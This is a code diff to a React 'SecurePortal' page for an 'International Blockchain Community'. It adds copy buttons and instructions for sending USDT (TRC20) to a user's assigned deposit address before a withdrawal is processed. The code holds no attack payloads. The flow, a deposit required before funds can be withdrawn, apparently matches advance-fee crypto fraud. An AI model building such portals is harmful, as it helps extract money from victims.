@@ -6,7 +6,7 @@ import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Textarea } from "@/components/ui/textarea";
-import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home } from "lucide-react";
+import { ShieldCheck, Lock, CheckCircle2, Key, User, Mail, Phone, FolderOpen, FileText, History, ArrowLeft, MessageCircle, Send, X, AlertTriangle, Clock, CheckCircle, Upload, Image, ExternalLink, Wallet, Bell, Home, Copy } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
@@ -1095,16 +1095,35 @@ export default function SecurePortal() {
               <CardHeader>
                 <CardTitle className="flex items-center gap-2 text-amber-900">
                   <Wallet className="w-5 h-5" />
-                  Your Deposit Address
+                  Your USDT Deposit Address (TRC20)
                 </CardTitle>
               </CardHeader>
               <CardContent>
-                <code className="block p-4 bg-white rounded border text-sm break-all font-mono">
-                  {currentCase.depositAddress}
-                </code>
-                <p className="text-sm text-amber-700 mt-3">
-                  Please use this address for your deposit. After completing your deposit, upload the receipt below.
-                </p>
+                <div className="flex items-center gap-2 p-4 bg-white rounded border">
+                  <code className="flex-1 text-sm break-all font-mono font-bold text-slate-900">
+                    {currentCase.depositAddress}
+                  </code>
+                  <Button
+                    variant="outline"
+                    size="sm"
+                    className="flex-shrink-0"
+                    onClick={() => {
+                      navigator.clipboard.writeText(currentCase.depositAddress || '');
+                      toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
+                    }}
+                    data-testid="button-copy-address"
+                  >
+                    <Copy className="w-4 h-4" />
+                  </Button>
+                </div>
+                <div className="mt-4 p-3 bg-amber-100 rounded-lg">
+                  <p className="text-sm text-amber-800 font-medium mb-2">Important Instructions:</p>
+                  <ul className="text-xs text-amber-700 space-y-1 list-disc list-inside">
+                    <li>Only send USDT on the TRC20 network</li>
+                    <li>After completing your deposit, upload the receipt below</li>
+                    <li>Keep your transaction hash for reference</li>
+                  </ul>
+                </div>
               </CardContent>
             </Card>
           )}
@@ -1255,9 +1274,24 @@ export default function SecurePortal() {
                   <>
                     <div className="bg-white p-4 rounded-lg border-2 border-dashed border-amber-300 mb-4">
                       <p className="text-xs text-slate-500 uppercase tracking-wider mb-2">Your Assigned Deposit Address (TRC20)</p>
-                      <code className="text-lg font-mono font-bold text-slate-900 break-all block">
-                        {currentCase.depositAddress}
-                      </code>
+                      <div className="flex items-center gap-3">
+                        <code className="flex-1 text-lg font-mono font-bold text-slate-900 break-all">
+                          {currentCase.depositAddress}
+                        </code>
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          className="flex-shrink-0 border-amber-400 hover:bg-amber-100"
+                          onClick={() => {
+                            navigator.clipboard.writeText(currentCase.depositAddress || '');
+                            toast({ title: "Copied!", description: "Deposit address copied to clipboard" });
+                          }}
+                          data-testid="button-copy-deposit-address"
+                        >
+                          <Copy className="w-4 h-4 mr-1" />
+                          Copy
+                        </Button>
+                      </div>
                     </div>
                     <div className="bg-amber-100 p-4 rounded-lg">
                       <p className="text-amber-900 font-semibold mb-2">Important Instructions:</p>
@@ -1546,14 +1580,61 @@ export default function SecurePortal() {
             </div>
           </div>
 
-          {/* Options */}
-          <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
-            <div className="w-8 h-[1px] bg-slate-300"></div>
-            Select Withdrawal Option
-            <div className="w-full h-[1px] bg-slate-300"></div>
-          </h3>
-          
-          <div className="grid md:grid-cols-2 gap-8 mb-12">
+          {/* Already Submitted Notice */}
+          {submissions.length > 0 ? (
+            <motion.div 
+              initial={{ opacity: 0, y: 20 }} 
+              animate={{ opacity: 1, y: 0 }}
+              className="bg-green-50 border-2 border-green-200 rounded-lg p-8 mb-10"
+            >
+              <div className="flex items-start gap-4">
+                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
+                  <CheckCircle2 className="w-8 h-8 text-green-600" />
+                </div>
+                <div className="flex-1">
+                  <h3 className="text-xl font-bold text-green-900 mb-2">Withdrawal Selection Confirmed</h3>
+                  <p className="text-green-700 mb-4">Your withdrawal option has already been submitted and is being processed.</p>
+                  
+                  <div className="bg-white rounded-lg p-4 border border-green-200 space-y-2">
+                    <div className="flex justify-between text-sm">
+                      <span className="text-slate-600">Reference Number</span>
+                      <span className="font-mono font-bold text-primary">IBC-{String(submissions[0]?.id || 0).padStart(6, '0')}</span>
+                    </div>
+                    <div className="flex justify-between text-sm">
+                      <span className="text-slate-600">Selected Option</span>
+                      <Badge className={submissions[0]?.selectedOption === 'A' ? 'bg-blue-600' : 'bg-slate-600'}>
+                        Option {submissions[0]?.selectedOption}
+                      </Badge>
+                    </div>
+                    <div className="flex justify-between text-sm">
+                      <span className="text-slate-600">Submitted On</span>
+                      <span className="font-medium">{new Date(submissions[0]?.submittedAt || Date.now()).toLocaleDateString()}</span>
+                    </div>
+                  </div>
+                  
+                  <div className="mt-6 flex gap-3">
+                    <Button onClick={() => setViewState('success')} className="bg-green-600 hover:bg-green-700">
+                      <Wallet className="w-4 h-4 mr-2" />
+                      View Deposit Instructions
+                    </Button>
+                    <Button variant="outline" onClick={() => setViewState('submissions')}>
+                      <History className="w-4 h-4 mr-2" />
+                      View History
+                    </Button>
+                  </div>
+                </div>
+              </div>
+            </motion.div>
+          ) : (
+            <>
+              {/* Options */}
+              <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
+                <div className="w-8 h-[1px] bg-slate-300"></div>
+                Select Withdrawal Option
+                <div className="w-full h-[1px] bg-slate-300"></div>
+              </h3>
+              
+              <div className="grid md:grid-cols-2 gap-8 mb-12">
             {/* Option A */}
             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
               <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')} data-testid="card-option-a">
@@ -1645,7 +1726,9 @@ export default function SecurePortal() {
                 </CardFooter>
               </Card>
             </motion.div>
-          </div>
+              </div>
+            </>
+          )}
         </motion.div>
       </main>
 
